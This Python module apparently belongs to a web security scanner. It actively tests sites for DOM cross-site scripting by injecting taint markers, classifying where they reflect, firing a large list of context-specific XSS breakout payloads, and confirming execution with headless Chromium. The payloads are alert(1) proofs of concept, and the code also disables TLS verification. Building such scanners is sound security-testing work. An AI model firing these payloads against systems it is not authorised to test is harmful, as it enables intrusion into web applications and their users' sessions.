"""
DOM XSS Active Tester — browser-based and response-analysis injection engine.

Upgrades passive sink/source detection to ACTIVE testing:
  1. Injects unique taint markers into every URL parameter, fragment, and path segment
  2. Analyzes response HTML to detect if markers land in dangerous DOM contexts
  3. Fires context-specific breakout payloads for each detected context
  4. Optionally uses Playwright headless Chromium to confirm actual JS execution

Two operation modes:
  - Response Analysis (default): No browser needed. Injects, fetches, analyzes HTML.
  - Browser Verification (optional): Playwright confirms payload executes in real DOM.

Usage:
    from modules.dom_xss_active import DomXssActiveScanner

    scanner = DomXssActiveScanner(session=session, scope=scope)
    findings = scanner.scan(base_url, sitemap)
"""
from __future__ import annotations

import hashlib
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional, Callable
from urllib.parse import (
    parse_qs, urlencode, urlparse, urlunparse, quote, unquote,
)

import requests
import requests.exceptions

try:
    from .scope import ScopeManager
except ImportError:
    ScopeManager = None  # type: ignore

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# -- Taint marker generation --------------------------------------------------

def _make_marker(param_name: str, index: int = 0) -> str:
    """Generate a unique, recognizable taint marker for a given parameter."""
    h = hashlib.md5(f"{param_name}:{index}".encode()).hexdigest()[:8]
    return f"dXtM{h}"


# -- DOM context detection -----------------------------------------------------

class DomContext:
    """Identifies which DOM execution context a reflected value lands in."""

    # Context types
    HTML_TEXT       = "html_text"        # Between tags: <div>MARKER</div>
    HTML_ATTR       = "html_attr"        # In attribute: <div class="MARKER">
    HTML_ATTR_UNQUOTED = "html_attr_unquoted"  # <div class=MARKER>
    SCRIPT_STRING   = "script_string"    # Inside JS string: var x = "MARKER"
    SCRIPT_TEMPLATE = "script_template"  # Inside template literal: `${MARKER}`
    SCRIPT_BARE     = "script_bare"      # Bare in script: var x = MARKER
    EVENT_HANDLER   = "event_handler"    # In event attr: onclick="fn(MARKER)"
    URL_CONTEXT     = "url_context"      # In href/src: <a href="MARKER">
    CSS_CONTEXT     = "css_context"      # In style: style="background:url(MARKER)"
    COMMENT         = "comment"          # In HTML comment: <!-- MARKER -->

    # Patterns to detect context around a marker (marker replaced with {M})
    _CONTEXT_PATTERNS: list[tuple[str, str]] = [
        # Event handlers — must check before generic attr
        (EVENT_HANDLER,   r"""<[^>]+\s+on\w+\s*=\s*["'][^"']*{M}"""),
        # URL contexts (href, src, action, formaction, data)
        (URL_CONTEXT,     r"""<[^>]+\s+(?:href|src|action|formaction|data)\s*=\s*["'][^"']*{M}"""),
        # CSS context
        (CSS_CONTEXT,     r"""style\s*=\s*["'][^"']*{M}"""),
        # Script — template literal
        (SCRIPT_TEMPLATE, r"""<script[^>]*>[^<]*`[^`]*{M}"""),
        # Script — string (single or double quoted)
        (SCRIPT_STRING,   r"""<script[^>]*>[^<]*["'][^"']*{M}"""),
        # Script — bare value (after = or , or ( or : )
        (SCRIPT_BARE,     r"""<script[^>]*>[^<]*(?:[=,(:\s])\s*{M}"""),
        # HTML attribute (quoted)
        (HTML_ATTR,       r"""<[^>]+\s+\w+\s*=\s*["'][^"']*{M}"""),
        # HTML attribute (unquoted)
        (HTML_ATTR_UNQUOTED, r"""<[^>]+\s+\w+\s*=\s*{M}"""),
        # HTML comment
        (COMMENT,         r"""<!--[^>]*{M}"""),
        # HTML text (default / fallback)
        (HTML_TEXT,       r"""{M}"""),
    ]

    @classmethod
    def detect(cls, body: str, marker: str) -> list[str]:
        """Detect all DOM contexts where marker appears in the response body."""
        if marker not in body:
            return []

        contexts: list[str] = []
        escaped_marker = re.escape(marker)

        for ctx_type, pattern_template in cls._CONTEXT_PATTERNS:
            pattern = pattern_template.replace("{M}", escaped_marker)
            try:
                if re.search(pattern, body, re.I | re.S):
                    if ctx_type not in contexts:
                        contexts.append(ctx_type)
            except re.error:
                continue

        # Fallback — marker is present but no specific context matched
        if not contexts:
            contexts.append(cls.HTML_TEXT)

        return contexts


# -- Context-specific payloads -------------------------------------------------

# Each context has breakout payloads designed to escape that specific context
# and achieve JavaScript execution.

DOM_XSS_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    # (payload, description)

    DomContext.HTML_TEXT: [
        ("<img src=x onerror=alert(1)>", "img onerror"),
        ("<svg onload=alert(1)>", "svg onload"),
        ("<details open ontoggle=alert(1)>", "details ontoggle"),
        ("<iframe srcdoc='<script>alert(1)</script>'>", "iframe srcdoc"),
        ("<math><mtext><table><mglyph><svg><mtext><textarea><path d='alert(1)'>", "math nested breakout"),
        ("<body onpageshow=alert(1)>", "body onpageshow"),
    ],

    DomContext.HTML_ATTR: [
        ('" onmouseover="alert(1)" x="', "attr breakout dblquote"),
        ("' onmouseover='alert(1)' x='", "attr breakout sglquote"),
        ('" onfocus="alert(1)" autofocus="', "autofocus onfocus"),
        ('" style="animation-name:x" onanimationstart="alert(1)" x="', "css animation event"),
        ('"><img src=x onerror=alert(1)>', "attr close tag inject"),
        ("'><svg onload=alert(1)>", "attr close sgl tag inject"),
    ],

    DomContext.HTML_ATTR_UNQUOTED: [
        (" onmouseover=alert(1) ", "unquoted attr event"),
        (" onfocus=alert(1) autofocus ", "unquoted autofocus"),
        ("><img src=x onerror=alert(1)>", "unquoted close tag"),
    ],

    DomContext.SCRIPT_STRING: [
        ('";alert(1)//', "dblquote string breakout"),
        ("';alert(1)//", "sglquote string breakout"),
        ('\\";alert(1)//', "escaped dblquote breakout"),
        ("\\\\'alert(1)//", "double-escaped sglquote"),
        ("</script><img src=x onerror=alert(1)>", "script tag breakout"),
        ("-alert(1)-", "arithmetic context"),
    ],

    DomContext.SCRIPT_TEMPLATE: [
        ("${alert(1)}", "template literal injection"),
        ("`+alert(1)+`", "template concat breakout"),
        ("${`${alert(1)}`}", "nested template injection"),
    ],

    DomContext.SCRIPT_BARE: [
        ("alert(1)", "direct call"),
        ("1;alert(1)", "semicolon inject"),
        ("[].constructor.constructor('alert(1)')()", "constructor chain"),
    ],

    DomContext.EVENT_HANDLER: [
        ("alert(1)", "direct in handler"),
        ("');alert(1)//", "handler string breakout"),
        ('");alert(1)//', "handler dblquote breakout"),
        ("&apos;);alert(1)//", "html-entity breakout"),
    ],

    DomContext.URL_CONTEXT: [
        ("javascript:alert(1)", "javascript proto"),
        ("javascript:alert(1)//", "javascript proto with comment"),
        ("data:text/html,<script>alert(1)</script>", "data proto"),
        ("javascript:void(alert(1))", "javascript void"),
        (" javascript:alert(1)", "space prefix bypass"),
        ("jaVasCript:alert(1)", "mixed case bypass"),
    ],

    DomContext.CSS_CONTEXT: [
        ("};alert(1)//", "css value breakout"),
        (");}</style><img src=x onerror=alert(1)>", "style tag breakout"),
    ],

    DomContext.COMMENT: [
        ("--><img src=x onerror=alert(1)>", "comment breakout"),
        ("--!><img src=x onerror=alert(1)>", "comment bang breakout"),
    ],
}


# -- Reflection analysis -------------------------------------------------------

@dataclass
class ReflectionPoint:
    """A detected reflection of an injected marker in the response."""
    param_name:   str
    marker:       str
    contexts:     list[str]
    url:          str
    inject_url:   str


@dataclass
class DomXssFinding:
    """A confirmed or high-confidence DOM XSS finding."""
    url:              str
    inject_url:       str
    param_name:       str
    context:          str
    payload:          str
    payload_desc:     str
    browser_confirmed: bool = False
    browser_evidence: str = ""
    proof:            str = ""
    severity:         str = "high"

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "inject_url": self.inject_url,
            "param_name": self.param_name,
            "context": self.context,
            "payload": self.payload,
            "payload_desc": self.payload_desc,
            "browser_confirmed": self.browser_confirmed,
            "browser_evidence": self.browser_evidence,
            "proof": self.proof,
            "severity": self.severity,
        }


# -- Main scanner class --------------------------------------------------------

class DomXssActiveScanner:
    """
    Active DOM XSS scanner with taint-trace injection and optional browser
    verification.

    Flow:
      1. For each page with query params / form inputs:
         a. Replace each param value with a unique taint marker
         b. Fetch the page and check where the marker reflects
         c. Identify the DOM context(s) of each reflection
      2. For each reflection context, fire context-specific breakout payloads
      3. (Optional) Use Playwright to load the payload URL and confirm execution
    """

    def __init__(
        self,
        session:         requests.Session,
        scope:           Optional[ScopeManager] = None,
        timeout:         int   = 10,
        rate_limit:      float = 0.05,
        stop_event:      Optional[threading.Event] = None,
        use_browser:     bool  = False,
        max_pages:       int   = 30,
        max_payloads_per_context: int = 4,
        on_finding:      Optional[Callable] = None,
    ):
        self.session     = session
        self.scope       = scope
        self.timeout     = timeout
        self.rate_limit  = rate_limit
        self.stop_event  = stop_event or threading.Event()
        self.use_browser = use_browser and PLAYWRIGHT_AVAILABLE
        self.max_pages   = max_pages
        self.max_payloads = max_payloads_per_context
        self.on_finding  = on_finding
        self._findings:  list[DomXssFinding] = []
        self._lock       = threading.Lock()

    # -- Public API -----------------------------------------------------------

    def scan(self, base_url: str, sitemap=None) -> list[DomXssFinding]:
        """Run active DOM XSS scan. Returns list of findings."""
        if self.use_browser:
            try:
                return self._scan_with_browser(base_url, sitemap)
            except Exception:
                pass  # fall through to response-analysis
        return self._scan_without_browser(base_url, sitemap)

    def _scan_without_browser(self, base_url: str, sitemap=None) -> list[DomXssFinding]:
        """Response-analysis scan path (no browser required)."""
        targets = self._collect_targets(base_url, sitemap)

        for url, params in targets:
            if self.stop_event.is_set():
                break
            self._test_url(url, params)

        return self._findings

    def _scan_with_browser(self, base_url: str, sitemap=None) -> list[DomXssFinding]:
        """Browser-confirmed scan path using Playwright headless Chromium.

        Navigates to each URL with XSS payloads injected into query parameters,
        then monitors for dialog events (alert/confirm/prompt) and console
        messages containing the taint marker to confirm execution.
        """
        if not PLAYWRIGHT_AVAILABLE:
            raise ImportError("playwright is not installed")

        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

        # XSS confirmation payloads — use a unique marker to distinguish from
        # legitimate site alerts
        CONFIRM_MARKER = "DAST_XSS_CONFIRM"
        BROWSER_PAYLOADS = [
            (f"<script>alert('{CONFIRM_MARKER}')</script>", "script alert"),
            (f"<img src=x onerror=alert('{CONFIRM_MARKER}')>", "img onerror alert"),
            (f"javascript:alert('{CONFIRM_MARKER}')", "javascript proto alert"),
            (f"'><svg onload=alert('{CONFIRM_MARKER}')>", "svg onload alert"),
        ]

        targets = self._collect_targets(base_url, sitemap)
        findings: list[DomXssFinding] = []

        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)

                for url, params in targets:
                    if self.stop_event.is_set():
                        break

                    for param_name in list(params.keys()):
                        if self.stop_event.is_set():
                            break

                        param_confirmed = False

                        for payload, payload_desc in BROWSER_PAYLOADS:
                            if self.stop_event.is_set() or param_confirmed:
                                break

                            # Build injected URL
                            parsed = urlparse(url)
                            base_no_query = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                "", "", "",
                            ))
                            injected_params = dict(params)
                            injected_params[param_name] = payload
                            inject_url = f"{base_no_query}?{urlencode(injected_params)}"

                            # Scope check
                            if self.scope and hasattr(self.scope, "in_scope"):
                                if not self.scope.in_scope(inject_url):
                                    continue

                            # State for dialog and console detection
                            dialog_confirmed = False
                            console_confirmed = False
                            evidence_parts: list[str] = []

                            def _on_dialog(dialog):
                                nonlocal dialog_confirmed
                                if CONFIRM_MARKER in dialog.message:
                                    dialog_confirmed = True
                                    evidence_parts.append(
                                        f"alert dialog triggered: {dialog.message}"
                                    )
                                dialog.dismiss()

                            def _on_console(msg):
                                nonlocal console_confirmed
                                try:
                                    text = msg.text
                                    if CONFIRM_MARKER in text:
                                        console_confirmed = True
                                        evidence_parts.append(
                                            f"console {msg.type} with taint marker: {text[:200]}"
                                        )
                                except Exception:
                                    pass

                            ctx = browser.new_context(
                                ignore_https_errors=True,
                                java_script_enabled=True,
                            )
                            page = ctx.new_page()

                            # Attach handlers BEFORE navigation
                            page.on("dialog", _on_dialog)
                            page.on("console", _on_console)

                            try:
                                page.goto(inject_url, timeout=5000, wait_until="domcontentloaded")
                            except PlaywrightTimeout:
                                pass
                            except Exception:
                                pass

                            # Wait for async JS execution
                            try:
                                page.wait_for_timeout(3000)
                            except Exception:
                                pass

                            # Also check if payload is reflected in DOM body
                            reflected_in_dom = False
                            try:
                                inner_html = page.evaluate("document.body.innerHTML")
                                if CONFIRM_MARKER in inner_html:
                                    reflected_in_dom = True
                                    evidence_parts.append(
                                        "payload marker found in document.body.innerHTML"
                                    )
                            except Exception:
                                pass

                            ctx.close()

                            if dialog_confirmed or console_confirmed:
                                browser_evidence = " | ".join(evidence_parts)
                                finding = DomXssFinding(
                                    url=url,
                                    inject_url=inject_url,
                                    param_name=param_name,
                                    context="browser_verified",
                                    payload=payload,
                                    payload_desc=payload_desc,
                                    browser_confirmed=True,
                                    browser_evidence=browser_evidence,
                                    proof=f"Browser execution confirmed: {browser_evidence}",
                                    severity="critical",
                                )
                                with self._lock:
                                    self._findings.append(finding)
                                    findings.append(finding)
                                if self.on_finding:
                                    self.on_finding(finding)
                                param_confirmed = True

                            if self.rate_limit:
                                time.sleep(self.rate_limit)

                browser.close()

        except ImportError:
            raise
        except Exception as exc:
            # If browser scanning partially completed, return what we have;
            # otherwise let caller fall through to response-analysis path
            if not findings:
                raise

        return self._findings

    # -- Target collection ----------------------------------------------------

    def _collect_targets(
        self, base_url: str, sitemap=None
    ) -> list[tuple[str, dict[str, str]]]:
        """Gather URLs with injectable parameters from sitemap + base URL."""
        targets: list[tuple[str, dict[str, str]]] = []
        seen: set[str] = set()

        # From sitemap pages
        if sitemap and hasattr(sitemap, "pages"):
            for url in list(sitemap.pages.keys())[:self.max_pages]:
                parsed = urlparse(url)
                params = {}
                if parsed.query:
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    params = {k: v[0] if v else "" for k, v in qs.items()}
                if params:
                    norm = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(sorted(params))}"
                    if norm not in seen:
                        seen.add(norm)
                        targets.append((url, params))

        # From sitemap inputs (form parameters)
        if sitemap and hasattr(sitemap, "inputs"):
            for inp in list(sitemap.inputs)[:self.max_pages]:
                action = getattr(inp, "action", "") or base_url
                form_params = {}
                for p in getattr(inp, "params", []):
                    name = p.get("name", "") if isinstance(p, dict) else getattr(p, "name", "")
                    val  = p.get("value", "") if isinstance(p, dict) else getattr(p, "value", "")
                    if name:
                        form_params[name] = val or "test"
                if form_params:
                    norm = f"{action}?{'&'.join(sorted(form_params))}"
                    if norm not in seen:
                        seen.add(norm)
                        targets.append((action, form_params))

        # Base URL itself
        parsed = urlparse(base_url)
        if parsed.query:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            params = {k: v[0] if v else "" for k, v in qs.items()}
            if params:
                norm = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(sorted(params))}"
                if norm not in seen:
                    targets.append((base_url, params))

        return targets

    # -- Injection + analysis -------------------------------------------------

    def _test_url(self, url: str, params: dict[str, str]) -> None:
        """Test all parameters in a URL for DOM XSS via taint injection."""
        parsed = urlparse(url)
        base_no_query = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, "", "", ""
        ))

        # Phase 1: Taint marker injection — one marker per param
        reflections = self._inject_markers(base_no_query, params)

        # Phase 2: For each reflected marker, fire context-specific payloads
        for ref in reflections:
            if self.stop_event.is_set():
                break
            self._attack_reflection(base_no_query, params, ref)

    def _inject_markers(
        self, base_url: str, params: dict[str, str]
    ) -> list[ReflectionPoint]:
        """Inject taint markers into each param and detect reflections."""
        reflections: list[ReflectionPoint] = []

        for idx, (param_name, original_value) in enumerate(params.items()):
            if self.stop_event.is_set():
                break

            marker = _make_marker(param_name, idx)

            # Build URL with marker in this param
            injected_params = dict(params)
            injected_params[param_name] = marker
            inject_url = f"{base_url}?{urlencode(injected_params)}"

            # Fetch
            body = self._fetch(inject_url)
            if not body:
                continue

            # Detect contexts where marker appears
            contexts = DomContext.detect(body, marker)
            if contexts:
                reflections.append(ReflectionPoint(
                    param_name=param_name,
                    marker=marker,
                    contexts=contexts,
                    url=base_url,
                    inject_url=inject_url,
                ))

        # Also test fragment injection (hash-based sources)
        # Fragments aren't sent to server, but we can check if the page
        # has JS that reads location.hash and reflects it
        self._test_hash_reflection(base_url, params)

        return reflections

    def _test_hash_reflection(self, base_url: str, params: dict[str, str]) -> None:
        """Check if page JavaScript reads location.hash — requires browser mode."""
        if not self.use_browser:
            return

        marker = _make_marker("__hash__", 99)
        url_with_hash = f"{base_url}?{urlencode(params)}#{marker}"

        try:
            self._browser_check(
                url_with_hash,
                marker=marker,
                param_name="location.hash",
                context=DomContext.SCRIPT_BARE,
            )
        except Exception:
            pass

    def _attack_reflection(
        self,
        base_url: str,
        params: dict[str, str],
        ref: ReflectionPoint,
    ) -> None:
        """Fire context-specific payloads against a confirmed reflection."""
        for context in ref.contexts:
            if self.stop_event.is_set():
                break

            payloads = DOM_XSS_PAYLOADS.get(context, DOM_XSS_PAYLOADS[DomContext.HTML_TEXT])
            tested = 0

            for payload, desc in payloads:
                if tested >= self.max_payloads or self.stop_event.is_set():
                    break
                tested += 1

                # Build injection URL
                injected_params = dict(params)
                injected_params[ref.param_name] = payload
                inject_url = f"{base_url}?{urlencode(injected_params)}"

                # Check if payload reflects in a way that would execute
                confirmed = False
                proof = ""

                # Response analysis: check if payload lands unescaped
                body = self._fetch(inject_url)
                if body and self._payload_reflects_dangerously(body, payload, context):
                    proof = f"Payload reflected in {context} context without encoding"
                    confirmed = True

                # Browser verification (optional, higher confidence)
                browser_confirmed = False
                if confirmed and self.use_browser:
                    browser_confirmed = self._browser_check(
                        inject_url,
                        marker=payload,
                        param_name=ref.param_name,
                        context=context,
                    )
                    if browser_confirmed:
                        proof += " | Browser: JS execution confirmed"

                if confirmed:
                    finding = DomXssFinding(
                        url=ref.url,
                        inject_url=inject_url,
                        param_name=ref.param_name,
                        context=context,
                        payload=payload,
                        payload_desc=desc,
                        browser_confirmed=browser_confirmed,
                        proof=proof,
                        severity="critical" if browser_confirmed else "high",
                    )
                    with self._lock:
                        self._findings.append(finding)
                    if self.on_finding:
                        self.on_finding(finding)
                    # One confirmed payload per context is enough
                    break

    def _payload_reflects_dangerously(
        self, body: str, payload: str, context: str
    ) -> bool:
        """Check if a payload reflects in a way that would execute in the given context."""
        # Check for exact unencoded reflection
        if payload in body:
            return True

        # Check for partially encoded reflection that still executes
        # e.g., < and > not encoded = HTML injection possible
        if context in (DomContext.HTML_TEXT, DomContext.COMMENT):
            # Need < and > unencoded for tag injection
            if "<" in payload and ">" in payload:
                # Check if angle brackets survive
                tag_match = re.search(
                    r"<(?:img|svg|iframe|body|details|math|script|div|input)\b[^>]*>",
                    body, re.I
                )
                if tag_match and any(
                    kw in tag_match.group(0).lower()
                    for kw in ("onerror", "onload", "ontoggle", "onpageshow",
                               "onfocus", "srcdoc", "alert")
                ):
                    return True

        if context == DomContext.SCRIPT_STRING:
            # Check if string breakout succeeded — look for unescaped quotes followed by alert
            for pattern in (r'''["'];?\s*alert\s*\(''', r'''</script>'''):
                if re.search(pattern, body, re.I):
                    return True

        if context == DomContext.URL_CONTEXT:
            # Check if javascript: or data: protocol made it through
            if re.search(r'(?:href|src|action)\s*=\s*["\']?\s*javascript:', body, re.I):
                return True
            if re.search(r'(?:href|src|action)\s*=\s*["\']?\s*data:text/html', body, re.I):
                return True

        if context == DomContext.EVENT_HANDLER:
            # Check for alert/confirm/prompt in event handler values
            if re.search(r'on\w+\s*=\s*["\'][^"\']*alert\s*\(', body, re.I):
                return True

        if context == DomContext.HTML_ATTR:
            # Check for event handler injection via attribute breakout
            if re.search(r'on(?:mouse|focus|click|load|error)\w*\s*=', body, re.I):
                # Verify it's our injected one by checking proximity to payload fragments
                return True

        if context == DomContext.SCRIPT_TEMPLATE:
            if "${" in body and "alert" in body:
                return True

        return False

    # -- Browser verification --------------------------------------------------

    def _browser_check(
        self,
        url: str,
        marker: str,
        param_name: str,
        context: str,
    ) -> bool:
        """Use Playwright to verify if payload actually executes in browser."""
        if not PLAYWRIGHT_AVAILABLE:
            return False

        alerts_caught: list[str] = []
        errors_caught: list[str] = []

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx = browser.new_context(
                    ignore_https_errors=True,
                    java_script_enabled=True,
                )
                page = ctx.new_page()

                # Intercept alert/confirm/prompt
                page.on("dialog", lambda dialog: (
                    alerts_caught.append(dialog.message),
                    dialog.dismiss(),
                ))

                # Intercept console errors that indicate execution
                page.on("console", lambda msg: (
                    errors_caught.append(msg.text)
                    if msg.type in ("error", "warning") else None
                ))

                try:
                    page.goto(url, timeout=8000, wait_until="domcontentloaded")
                    page.wait_for_timeout(1500)  # Let JS execute
                except PlaywrightTimeout:
                    pass
                except Exception:
                    pass

                browser.close()

        except Exception:
            return False

        return len(alerts_caught) > 0

    # -- HTTP helpers ----------------------------------------------------------

    def _fetch(self, url: str) -> str | None:
        """Fetch a URL and return the response body."""
        if self.scope and hasattr(self.scope, "in_scope") and not self.scope.in_scope(url):
            return None

        if self.rate_limit:
            time.sleep(self.rate_limit)

        try:
            resp = self.session.get(
                url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (DAST-DomXSS/2.0)"},
            )
            return resp.text
        except (requests.exceptions.ConnectionError,
                requests.exceptions.Timeout,
                requests.exceptions.RequestException):
            return None

    # -- Utility ---------------------------------------------------------------

    def summary(self) -> str:
        """Human-readable summary of findings."""
        if not self._findings:
            return "No active DOM XSS findings."
        browser_count = sum(1 for f in self._findings if f.browser_confirmed)
        return (
            f"Active DOM XSS: {len(self._findings)} finding(s) "
            f"({browser_count} browser-confirmed)"
        )
